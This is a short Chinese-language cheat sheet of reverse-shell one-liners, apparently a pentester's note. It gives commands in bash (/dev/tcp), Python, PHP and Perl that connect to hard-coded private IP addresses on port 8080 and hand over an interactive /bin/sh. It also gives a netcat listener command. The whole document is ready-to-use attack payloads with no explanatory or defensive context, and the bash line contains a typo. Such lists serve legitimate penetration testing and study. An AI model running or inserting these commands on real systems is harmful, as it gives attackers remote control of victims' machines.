# 反弹shell

## bash:
反弹shell: bash - i >& /dev/tcp/192.168.1.7/8080 0>&1

监听：nc -lvvp 8080

## python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## php:
php -r '$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

## perl：
perl -e 'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'